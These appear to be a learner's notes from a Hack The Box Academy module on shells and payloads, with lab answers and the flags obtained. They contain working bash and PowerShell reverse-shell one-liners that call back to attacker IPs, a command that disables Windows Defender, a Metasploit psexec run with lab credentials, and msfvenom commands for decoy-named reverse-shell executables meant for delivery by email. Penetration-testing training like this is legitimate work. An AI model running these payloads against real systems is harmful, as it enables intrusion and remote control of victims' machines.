# Shell Basics

## Anatomy of a Shell

Every operating system has a shell, and to interact with it, we must use an application known as a `terminal emulator`. The terminal emulator we interact with on targets will essentially be dependant on what exists on the system natively.

Much like a human language interpreter will translate spoken or sign language in real-time, a `command language interpreter` is a program working to interpret the instructions provided by the user and issue the tasks to the operating system for processing. So when we discuss command-line interfaces, we know it is a combination of the operating system, terminal emulator application, and the command language interpreter. Many different command language interpreters can be used, some of which are also called `shell scripting languages` or `Command and Scripting interpreters` as defined in the [Execution techniques](https://attack.mitre.org/techniques/T1059/) of the `MITRE ATT&CK Matrix`. We do not need to be software developers to understand these concepts, but the more we know, the more success we can have when attempting to exploit vulnerable systems to gain a shell session.

Understanding the command language interpreter in use on any given system will also give us an idea of what commands & scripts we should use. Lets get hands-on with some of these concepts.
### Q&A

1. Which two shell languages did we experiment with in this section? `bash&powershell`

2. In Pwnbox issue the $PSversiontable variable using PowerShell. Submit the edition of PowerShell that is running as the answer. `Core`

---
## Bind Shells

In many cases, we will be working to establish a [Shell](../../../3%20-%20Tags/Hacking%20Concepts/Shell.md) on a system on a local or remote network. This means we will be looking to use the terminal emulator application on our local attack box to control the remote system through its shell. This is typically done by using a `Bind` or [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md).

With a bind shell, the `target` system has a listener started and awaits a connection from a pentester's system (attack box).

We would connect directly with the [IP address](../../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) and `port` listening on the target. There can be many challenges associated with getting a shell this way. Here are some to consider:

- There would have to be a listener already started on the target.
- If there is no listener started, we would need to find a way to make this happen.
- Admins typically configure strict incoming firewall rules and NAT (with PAT implementation) on the edge of the network (public-facing), so we would need to be on the internal network already.
- Operating system firewalls (on Windows & Linux) will likely block most incoming connections that aren't associated with trusted network-based applications.

OS firewalls can be troublesome when establishing a shell since we need to consider IP addresses, ports, and the tool in use to get our connection working successfully. In the example above, the application used to start the listener is called [GNU Netcat](https://en.wikipedia.org/wiki/Netcat). `Netcat` (`nc`) is considered our `Swiss-Army Knife` since it can function over TCP, UDP, and Unix sockets. It's capable of using IPv4 & IPv6, opening and listening on sockets, operating as a proxy, and even dealing with text input and output. We would use nc on the attack box as our `client`, and the target would be the `server`.

Let's get a more in-depth understanding of this by practicing with [Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) and establishing a bind shell connection with a host on the same network with no restrictions in place.
### Establishing a Basic Bind Shell with Netcat

We have shown that we can use Netcat to send text between the client and the server, but this is not a bind shell because we cannot interact with the OS and file system. We are only able to pass text within the pipe setup by Netcat. Let's use Netcat to serve up our shell to establish a real bind shell.

On the server-side, we will need to specify the `directory`, `shell`, `listener`, work with some `pipelines`, and `input` & `output` `redirection` to ensure a shell to the system gets served when the client attempts to connect.

```bash
Target@server:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
```

The commands above are considered our payload, and we delivered this payload manually. We will notice that the commands and code in our payloads will differ depending on the host operating system we are delivering it to.

Back on the client, use Netcat to connect to the server now that a shell on the server is being served.

```bash
mdn0x@htb[/htb]$ nc -nv 10.129.41.200 7777

Target@server:~$
```

We will notice that we have successfully established a bind shell session with the target. Keep in mind that we had complete control over both our attack box and the target system in this scenario, which isn't typical. We worked through these exercises to understand the basics of the bind shell and how it works without any security controls (NAT enabled routers, hardware firewalls, Web Application Firewalls, IDS, IPS, OS firewalls, endpoint protection, authentication mechanisms, etc...) in place or exploits needed. This fundamental understanding will be helpful as we get into more challenging situations and realistic scenarios working with vulnerable systems.

As mentioned earlier in this section, it is also good to remember that the bind shell is much easier to defend against. Since the connection will be received incoming, it is more likely to get detected and blocked by firewalls even if standard ports are used when starting a listener. There are ways to get around this by using a reverse shell which we will discuss in the next section.

Now, let's test our understanding of these concepts with some challenge questions.
### Exercise

Target IP:10.129.201.134

user "htb-student" and password "HTB_@cademy_stdnt!"

1. Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session? `443`

2. SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up. When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

```bash
└─$ ssh htb-student@10.129.201.134



htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f




└─$ nc -nv 10.129.201.134 7777
(UNKNOWN) [10.129.201.134] 7777 (?) open
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

htb-student@ubuntu:/customscripts$ cat flag.txt
B1nD_Shells_r_cool
```
## Reverse Shells

With a [Reverse Shell](../../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md), the attack box will have a listener running, and the target will need to initiate the connection.

We will often use this kind of shell as we come across vulnerable systems because it is likely that an admin will overlook outbound connections, giving us a better chance of going undetected. The last section discussed how bind shells rely on incoming connections allowed through the firewall on the server-side. It will be much harder to pull this off in a real-world scenario. As seen in the image above, we are starting a listener for a reverse shell on our attack box and using some method (example: `Unrestricted File Upload`, `Command Injection`, etc..) to force the target to initiate a connection with our target box, effectively meaning our attack box becomes the server and the target becomes the client.

We don't always need to re-invent the wheel when it comes to payloads (commands & code) we intend to use when attempting to establish a reverse shell with a target. There are helpful tools that infosec veterans have put together to assist us. [Reverse Shell Cheat Sheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement. We should be mindful that many admins are aware of public repositories and open-source resources that penetration testers commonly use. They can reference these repos as part of their core considerations on what to expect from an attack and tune their security controls accordingly. In some cases, we may need to customize our attacks a bit.

Let's work hands-on with this to understand these concepts better.
### Simple Reverse Shell in Windows

This time around with our listener, we are binding it to a common port (`443`), this port usually is for `HTTPS` connections. We may want to use common ports like this because when we initiate the connection to our listener, we want to ensure it does not get blocked going outbound through the OS firewall and at the network level. It would be rare to see any security team blocking 443 outbound since many applications and organizations rely on HTTPS to get to various websites throughout the workday. That said, a firewall capable of deep packet inspection and Layer 7 visibility may be able to detect & stop a reverse shell going outbound on a common port because it's examining the contents of the network packets, not just the IP address and port. Detailed firewall evasion is outside of the scope of this module, so we will only briefly touch on detection & evasion techniques throughout the module, as well as in the dedicated section at the end.

Once the [Windows](../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) target has spawned, let's connect using RDP.

[Netcat](../../../3%20-%20Tags/Hacking%20Tools/Netcat.md) can be used to initiate the reverse shell on the Windows side, but we must be mindful of what applications are present on the system already. Netcat is not native to Windows systems, so it may be unreliable to count on using it as our tool on the Windows side. We will see in a later section that to use Netcat in Windows, we must transfer a Netcat binary over to a target, which can be tricky when we don't have file upload capabilities from the start. That said, it's ideal to use whatever tools are native (living off the land) to the target we are trying to gain access to.

`What applications and shell languages are hosted on the target?`

This is an excellent question to ask any time we are trying to establish a reverse shell. Let's use command prompt & PowerShell to establish this simple reverse shell. We can use a standard PowerShell reverse shell one-liner to illustrate this point.

On the Windows target, open a command prompt and copy & paste this command:

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Please take a close look at the command and consider what we need to change for this to allow us to establish a reverse shell with our attack box. This PowerShell code can also be called `shell code` or our `payload`. Delivering this payload onto the Windows system was pretty straightforward, considering we have complete control of the target for demonstration purposes. As this module progresses, we will notice the difficulty increases in how we deliver the payload onto targets.

`What happened when we hit enter in command prompt?`

The `Windows Defender antivirus` (`AV`) software stopped the execution of the code. This is working exactly as intended, and from a `defensive` perspective, this is a `win`. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the `Virus & threat protection settings` or by using this command in an administrative PowerShell console (right-click, run as admin):

**Disable AV**

```powershell
PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
```

Back on our attack box, we should notice that we successfully established a reverse shell. We can see this by the change in the prompt that starts with `PS` and our ability to interact with the OS and file system. Try running some standard Windows commands to practice a bit.
#### Exercise

1. When establishing a reverse shell session with a target, will the target act as a client or server? `client`

2. Connect to the target via RDP and establish a reverse shell session with your attack box then submit the hostname of the target box. `Shells-Win10`

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Shells_Payloads]
└─$ xfreerdp3 /v:10.129.201.51 /u:htb-student /p:HTB_@cademy_stdnt!
```

Command on the target [CMD](../../../3%20-%20Tags/Hacking%20Concepts/CMD.md): `hostname`

---
# Payloads
## Introduction to Payloads

`Have you ever sent an email or text to someone?`

Most of us probably have. The message we send in an email or text is the packet's payload as it is sent across the vast Internet. In computing, the [Payload](../../../3%20-%20Tags/Hacking%20Concepts/Payload.md) is the intended message. In information security, the payload is the command and/or code that exploits the vulnerability in an OS and/or application. The payload is the command and/or code that performs the malicious action from a defensive perspective. As we saw in the reverse shells section, Windows Defender stopped the execution of our PowerShell payload because it was considered malicious code.

Keep in mind that when we deliver and execute payloads, just like any other program, we give the target computer instructions on what it needs to do. The terms "malware" and "malicious code" romanticize the process and make it more mysterious than it is. Any time we work with payloads, let's challenge ourselves to explore what the code & commands are actually doing. We will start this process by breaking down the one-liners we worked with earlier:

**Netcat/Bash Reverse Shell One-liner**

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

The commands above make up a common one-liner issued on a Linux system to serve a Bash shell on a network socket utilizing a Netcat listener. We used this earlier in the Bind Shells section. It's often copied & pasted but not often understood. Let's break down each portion of the one-liner:

Removes the `/tmp/f` file if it exists, `-f` causes `rm` to ignore nonexistent files. The semi-colon (`;`) is used to execute the command sequentially.

Makes a [FIFO named pipe file](https://man7.org/linux/man-pages/man7/fifo.7.html) at the location specified. In this case, /tmp/f is the FIFO named pipe file, the semi-colon (`;`) is used to execute the command sequentially.

Concatenates the FIFO named pipe file /tmp/f, the pipe (`|`) connects the standard output of cat /tmp/f to the standard input of the command that comes after the pipe (`|`).

Specifies the command language interpreter using the `-i` option to ensure the shell is interactive. `2>&1` ensures the standard error data stream (`2`) `&` standard output data stream (`1`) are redirected to the command following the pipe (`|`).

Uses Netcat to send a connection to our attack host `10.10.14.12` listening on port `7777`. The output will be redirected (`>`) to /tmp/f, serving the Bash shell to our waiting Netcat listener when the reverse shell one-liner command is executed

**PowerShell One-liner**

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

We will dissect the rather large PowerShell command you can see above. It may look like a lot, but hopefully, we can demystify it a bit.

Executes `powershell.exe` with no profile (`nop`) and executes the command/script block (`-c`) contained in the quotes. This particular command is issued inside of command-prompt, which is why PowerShell is at the beginning of the command. It's good to know how to do this if we discover a Remote Code Execution vulnerability that allows us to execute commands directly in `cmd.exe`.

Sets/evaluates the variable `$client` equal to (`=`) the `New-Object` cmdlet, which creates an instance of the `System.Net.Sockets.TCPClient` .NET framework object. The .NET framework object will connect with the TCP socket listed in the parentheses `(10.10.14.158,443)`. The semi-colon (`;`) ensures the commands & code are executed sequentially.

Sets/evaluates the variable `$stream` equal to (`=`) the `$client` variable and the .NET framework method called [GetStream](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.getstream?view=net-5.0) that facilitates network communications. The semi-colon (`;`) ensures the commands & code are executed sequentially.

Creates a byte type array (`[]`) called `$bytes` that returns 65,535 zeros as the values in the array. This is essentially an empty byte stream that will be directed to the TCP listener on an attack box awaiting a connection.

Starts a `while` loop containing the `$i` variable set equal to (`=`) the .NET framework [Stream.Read](https://docs.microsoft.com/en-us/dotnet/api/system.io.stream.read?view=net-5.0) (`$stream.Read`) method. The parameters: buffer (`$bytes`), offset (`0`), and count (`$bytes.Length`) are defined inside the parentheses of the method.

Sets/evaluates the variable `$data` equal to (`=`) an [ASCII](https://en.wikipedia.org/wiki/ASCII) encoding .NET framework class that will be used in conjunction with the `GetString` method to encode the byte stream (`$bytes`) into ASCII. In short, what we type won't just be transmitted and received as empty bits but will be encoded as ASCII text. The semi-colon (`;`) ensures the commands & code are executed sequentially.

Sets/evaluates the variable `$sendback` equal to (`=`) the Invoke-Expression (`iex`) cmdlet against the `$data` variable, then redirects the standard error (`2>`) `&` standard output (`1`) through a pipe (`|`) to the `Out-String` cmdlet which converts input objects into strings. Because Invoke-Expression is used, everything stored in $data will be run on the local computer. The semi-colon (`;`) ensures the commands & code are executed sequentially.

Sets/evaluates the variable `$sendback2` equal to (`=`) the `$sendback` variable plus (`+`) the string PS (`'PS'`) plus `+` path to the working directory (`(pwd).path`) plus (`+`) the string `'> '`. This will result in the shell prompt being PS C:\workingdirectoryofmachine >. The semi-colon (`;`) ensures the commands & code are executed sequentially. Recall that the + operator in programming combines strings when numerical values aren't in use, with the exception of certain languages like C and C++ where a function would be needed.

Sets/evaluates the variable `$sendbyte` equal to (`=`) the ASCII encoded byte stream that will use a TCP client to initiate a PowerShell session with a Netcat listener running on the attack box.

This is the [TcpClient.Close](https://docs.microsoft.com/en-us/dotnet/api/system.net.sockets.tcpclient.close?view=net-5.0) method that will be used when the connection is terminated.

The one-liner we just examined together can also be executed in the form of a PowerShell script (`.ps1`). We can see an example of this by viewing the source code :  [nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)

Understanding what different types of payloads are doing can help us understand why AV is blocking us from execution and give us some idea of what we might need to change in our code to bypass restrictions. This is something we will explore further in this module. For now, understand that the payloads we use to get a shell on a system will largely be determined by what OS, shell interpreter languages, and even programming languages are present on the target.

Not all payloads are one-liners and deployed manually like those we studied in this section. Some are generated using automated attack frameworks and deployed as a pre-packaged/automated attack to obtain a shell. Like in the very powerful [Metasploit](../../../3%20-%20Tags/Hacking%20Tools/Metasploit.md)-framework, which we will work with in the next section.
## Automating Payloads & Delivery with Metasploit

[Metasploit](https://www.metasploit.com) is an automated attack framework developed by `Rapid7` that streamlines the process of exploiting vulnerabilities through the use of pre-built modules that contain easy-to-use options to exploit vulnerabilities and deliver payloads to gain a shell on a vulnerable system. It can make exploiting a vulnerable system so easy that some Cybersecurity training vendors limit how many times it can be used on lab exams. Here at Hack The Box, we encourage experimenting with tools in our lab environments until you have a solid foundational understanding. Most organizations will not limit us on which tools we can or cannot use on an engagement. However, they will expect us to know what we are doing. Therefore, it is our responsibility to seek an understanding as we learn. Not understanding the effects of the tools we use can be destructive in a live penetration test or audit. This is one primary reason we should consistently seek a deeper understanding of the tools, techniques, methodologies, and practices we learn.

In this section, we will interact with the `community edition` of Metasploit on Pwnbox. We will use pre-built `modules` and craft payloads with `MSFVenom`. It is important to note that many established cybersecurity firms utilize the paid edition of Metasploit called `Metasploit Pro` to conduct penetration tests, security audits, and even social engineering campaigns. If you want to explore the differences between the community edition and Metasploit Pro, you can check out this [comparison chart](https://www.rapid7.com/products/metasploit/download/editions/).

We could spend the rest of this module covering everything about Metasploit, but we are only going to go so far as to work with the very basics within the context of shells & payloads.

Let's start working hands-on with Metasploit by launching the Metasploit framework console as root (`sudo msfconsole`)

We can see there is creative ASCII art presented as the banner at launch and some numbers of particular interest.

- `2131` exploits
- `592` payloads

These numbers can change as the maintainers add and remove code or if you import a module for use into Metasploit. Let's get familiar with Metasploit payloads by using a classic `exploit module` that can be used to compromise a Windows system. Remember that Metasploit can be used for more than just exploitation. We can also use different modules to scan & enumerate targets.

In this case, we will be using enumeration results from a [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) scan to pick a [Metasploit](../../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) module to use.

In the output, we see several standard ports that are typically open on a [Windows](../../../3%20-%20Tags/Hacking%20Concepts/Windows.md) system by default. Remember that scanning and  [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) is an excellent way to know what OS (Windows or Linux) our target is running to find an appropriate module to run with Metasploit. Let's go with [SMB](../../../3%20-%20Tags/Hacking%20Concepts/SMB.md) (listening on `445`) as the potential attack vector.

Once we have this information, we can use Metasploit's search functionality to discover modules that are associated with SMB. In the `msfconsole`, we can issue the command `search smb` to get a list of modules associated with SMB vulnerabilities:

```
msf6 > search smb
```

We will see a long list of `Matching Modules` associated with our search. Notice the format each module is in. Each module has a number listed on the far left of the table to make selecting the module easier, a `Name`, `Disclosure Date`, `Rank`, `Check` and `Description`.

Once we select the module, we will notice a change in the prompt that gives us the ability to configure the module based on parameters specific to our environment.

Notice how `exploit` is outside of the parentheses. This can be interpreted as the MSF module type being an exploit, and the specific exploit & payload is written for Windows. The attack vector is `SMB`, and the Meterpreter payload will be delivered using [psexec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec). Let's learn more about using this exploit and delivering the payload by using the `options` command.

This is one area where Metasploit shines in terms of ease of use. In the output of the module options, we see various options and settings with a description of what each setting means. We will not be using `SERVICE_DESCRIPTION`, `SERVICE_DISPLAY_NAME` and `SERVICE_NAME` in this section. Notice how this particular exploit will use a reverse TCP shell connection utilizing `Meterpreter`. A Meterpreter shell gives us far more functionality than a raw TCP reverse shell, as we established in this module's earlier sections. It is the default payload that is used in Metasploit.

We will want to use the `set` command to configure the following settings as such:

```
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

These settings will ensure that our payload is delivered to the proper target (`RHOSTS`), uploaded to the default administrative share (`ADMIN$`) utilizing credentials (`SMBPass` & `SMBUser`), then initiate a reverse shell connection with our local host machine (`LHOST`).

These settings will be specific to the IP address on your attack box and on the target box. As well as with credentials you may gather on an engagement. We can set the LHOST (local host) VPN tunnel IP address or the VPN tunnel interface ID.

After we issue the `exploit` command, the exploit is run, and there is an attempt to deliver the payload onto the target utilizing the Meterpreter payload. Metasploit reports back each step of this process, as seen in the output. We know this was successful because a `stage` was sent successfully, which established a Meterpreter shell session (`meterpreter >`) and a system-level shell session. Keep in mind that Meterpreter is a payload that uses in-memory DLL injection to stealthfully establish a communication channel between an attack box and a target. The proper credentials and attack vector can give us the ability to upload & download files, execute system commands, run a keylogger, create/start/stop services, manage processes, and more.

In this case, as detailed in the [Rapid 7 Module Documentation](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec/): "This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean up after itself. The service created by this tool uses a randomly chosen name and description. "

Like other command language interpreters (Bash, PowerShell, ksh, etc...), Meterpreter shell sessions allow us to issue a set of commands we can use to interact with the target system. We can use the `?` to see a list of commands we can use. We will notice limitations with the Meterpreter shell, so it is good to attempt to use the `shell` command to drop into a system-level shell if we need to work with the complete set of system commands native to our target.
### Exercise

1. What command language interpreter is used to establish a system shell session with the target?            `Powershell`

Exploit the target using what you've learned in this section, then submit the name of the file located in htb-student's Documents folder. (Format: filename.extension)

Authenticate to with user "htb-student" and password "HTB_@cademy_stdnt!"

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Academy/Shells_Payloads]
└─$ rustscan -a 10.129.201.160

Open 10.129.201.160:7
Open 10.129.201.160:9
Open 10.129.201.160:17
Open 10.129.201.160:19
Open 10.129.201.160:13
Open 10.129.201.160:80
Open 10.129.201.160:445
Open 10.129.201.160:135
Open 10.129.201.160:139
Open 10.129.201.160:2179
Open 10.129.201.160:5040

└─$ nmap -sC -sV -Pn 10.129.201.160 -p 445

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 10 Pro 18363 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Shells-Win10
|   NetBIOS computer name: SHELLS-WIN10\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-11-11T09:26:13-08:00
| smb2-time: 
|   date: 2026-11-11T17:26:14
|_  start_date: N/A
|_clock-skew: mean: 2h40m01s, deviation: 4h37m09s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)




msf > use exploit(windows/smb/psexec)
msf exploit(windows/smb/psexec) > set RHOSTS 10.129.201.160
RHOSTS => 10.129.201.160
msf exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf exploit(windows/smb/psexec) > set LHOST tun0
LHOST => 10.10.15.30
msf exploit(windows/smb/psexec) > run

meterpreter > shell
Process 5112 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18363.1854]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\htb-student\Documents>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C41A-F2ED

 Directory of C:\Users\htb-student\Documents

10/16/2021  12:17 PM    <DIR>          .
10/16/2021  12:17 PM    <DIR>          ..
10/16/2021  12:16 PM               268 staffsalaries.txt
               1 File(s)            268 bytes
               2 Dir(s)  11,677,528,064 bytes free
```

`staffsalaries.txt`
## Crafting Payloads with MSFvenom

We must be mindful that using automated attacks in Metasploit requires us to reach a vulnerable target machine over the network. Consider what we did in the last section. To `run the exploit module`, `deliver the payload`, and `establish the shell session`, we needed to communicate with the system in the first place. This may have been possible through having a presence on the internal network or a network that has routes into the network where the target resides. There will be situations where we do not have direct network access to a vulnerable target machine. In these cases, we will need to get crafty in how the payload gets delivered and executed on the system. One such way may be to use [MsfVenom](../../../3%20-%20Tags/Hacking%20Tools/MsfVenom.md) to craft a payload and send it via email message or other means of social engineering to drive that user to execute the file.

In addition to providing a payload with flexible delivery options, MSFvenom also allows us to `encrypt` & `encode` payloads to bypass common anti-virus detection signatures. Let's practice a bit with these concepts.

We can issue the command `msfvenom -l payloads` to list all the available payloads. Below are just some of the payloads available.

We can see a few details that will help us understand payloads further. First of all, we can see that the payload naming convention almost always starts by listing the OS of the target (`Linux`, `Windows`, `MacOS`, `mainframe`, etc...). We can also see that some payloads are described as (`staged`) or (`stageless`). Let's cover the difference.
### Staged vs. Stageless Payloads

`Staged` payloads create a way for us to send over more components of our attack. We can think of it like we are "setting the stage" for something even more useful. Take for example this payload `linux/x86/shell/reverse_tcp`. When run using an exploit module in Metasploit, this payload will send a small `stage` that will be executed on the target and then call back to the `attack box` to download the remainder of the payload over the network, then executes the shellcode to establish a reverse shell. Of course, if we use Metasploit to run this payload, we will need to configure options to point to the proper IPs and port so the listener will successfully catch the shell. Keep in mind that a stage also takes up space in memory which leaves less space for the payload. What happens at each stage could vary depending on the payload.

`Stageless` payloads do not have a stage. Take for example this payload `linux/zarch/meterpreter_reverse_tcp`. Using an exploit module in Metasploit, this payload will be sent in its entirety across a network connection without a stage. This could benefit us in environments where we do not have access to much bandwidth and latency can interfere. Staged payloads could lead to unstable shell sessions in these environments, so it would be best to select a stageless payload. In addition to this, stageless payloads can sometimes be better for evasion purposes due to less traffic passing over the network to execute the payload, especially if we deliver it by employing social engineering. This concept is also very well explained by Rapid 7 in this blog post on [stageless Meterpreter payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/).

Now that we understand the differences between a staged and stageless payload, we can identify them within Metasploit. The answer is simple. The `name` will give you your first marker. Take our examples from above, `linux/x86/shell/reverse_tcp` is a staged payload, and we can tell from the name since each / in its name represents a stage from the shell forward. So `/shell/` is a stage to send, and `/reverse_tcp` is another. This will look like it is all pressed together for a stageless payload. Take our example `linux/zarch/meterpreter_reverse_tcp`. It is similar to the staged payload except that it specifies the architecture it affects, then it has the shell payload and network communications all within the same function `/meterpreter_reverse_tcp`. For one last quick example of this naming convention, consider these two `windows/meterpreter/reverse_tcp` and `windows/meterpreter_reverse_tcp`. The former is a `Staged` payload. Notice the naming convention separating the stages. The latter is a `Stageless` payload since we see the shell payload and network communication in the same portion of the name. If the name of the payload doesn't appear quite clear to you, it will often detail if the payload is staged or stageless in the description.

**Build It**

```
mdn0x@htb[/htb]$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
```

At this point, we have the payload created on our attack box. We would now need to develop a way to get that payload onto the target system. There are countless ways this can be done. Here are just some of the common ways:

- Email message with the file attached.
- Download link on a website.
- Combined with a Metasploit exploit module (this would likely require us to already be on the internal network).
- Via flash drive as part of an onsite penetration test.

Once the file is on that system, it will also need to be executed.

Imagine for a moment: the target machine is an Ubuntu box that an IT admin uses to manage network devices (hosting configuration scripts, accessing routers & switches, etc.). We could get them to click the file in an email we sent because they were carelessly using this system as if it was a personal computer or workstation.

We would have a listener ready to catch the connection on the attack box side upon successful execution. When the file is executed, we see that we have caught a shell.
### Executing a Simple Stageless Payload On a Windows System

This same concept can be used to create payloads for various platforms, including Windows. We can also use msfvenom to craft an executable (`.exe`) file that can be run on a Windows system to provide a shell. 

```
mdn0x@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
```

The command syntax can be broken down in the same way we did above. The only differences, of course, are the `platform` (`Windows`) and format (`.exe`) of the payload.

This is another situation where we need to be creative in getting this payload delivered to a target system. Without any `encoding` or `encryption`, the payload in this form would almost certainly be detected by Windows Defender AV.
If the AV was disabled all the user would need to do is double click on the file to execute and we would have a shell session.

---
# Windows Shells
## Infiltrating Windows

Since many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnectivity with cloud services, Windows subsystem for Linux, and much more, the Microsoft attack surface has grown as well.

For example, just in the last five years, there have been `3688` reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from [HERE](https://www.cvedetails.com/vendor/26/Microsoft.html)

Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let's discuss those for a minute.

With these vulnerabilities in mind, Windows isn't going anywhere. We need to be proficient with identifying vulnerabilities, exploiting them, and moving around in Windows hosts and environments. An understanding of these concepts can help us secure our environments from attack as well. Now it's time to dive in and explore some Windows-focused exploit fun.
### Enumerating Windows & Fingerprinting Methods

This module assumes you have already performed your host enumeration phase and understand what services are commonly seen on hosts. We are just attempting to give you a few quick tricks to determine if a host is likely a Windows machine. Check out the [Network Enumeration With NMAP](https://academy.hackthebox.com/course/preview/network-enumeration-with-nmap) module for a more detailed look at host enumeration and fingerprinting.

Since we have a set of targets, `what are a few ways to determine if the host is likely a Windows Machine`? To answer this question, we can look at a few things. The first one being the `Time To Live` (TTL) counter when utilizing ICMP to determine if the host is up. A typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response you will see. This value may not always be exact, especially if you are not in the same layer three network as the target. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. In the ping output `below`, we can see an example of this. For the example, we pinged a Windows 10 host and can see we have received replies with a TTL of 128. Check out this [link](https://subinsb.com/default-device-ttl-values/) for a nice table showing other TTL values by OS.

Another way we can validate if the host is Windows or not is to use our handy tool, `NMAP`. [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) has a cool capability built in to help with OS identification and many other scripted scans to check for anything from a specific vulnerability to information gathered from SNMP. For this example, we will utilize the `-O` option with verbose output `-v` to initialize an OS Identification scan against our target `192.168.86.39`. As we scroll through the shell session below and look at the results, a few things give this away as a Windows host. We will focus on those here in a minute. Look carefully at the bottom of the shell session. We can see the point labeled `OS CPE: cpe:/o:microsoft:windows_10` and `OS details: Microsoft Windows 10 1709 - 1909`. Nmap made this guess based on several different metrics it derives from the TCP/IP stack. It uses those qualities to determine the OS as it checks it against a database of OS fingerprints. In this case, Nmap has determined that our host is a Windows 10 machine with a revision level between 1709 & 1909.

If you run into issues and the scans turn up little results, attempt again with the `-A` and `-Pn` options. This will perform a different scan and may work. For more info on how this process works, check out this article from the [Nmap Documentation](https://nmap.org/book/man-os-detection.html). Be careful of this detection method. Implementing a firewall or other security features can obscure the host or mess the results up. When possible, use more than one check to make a determination.

```
mdn0x@htb[/htb]$ sudo nmap -v -O 192.168.86.39
```

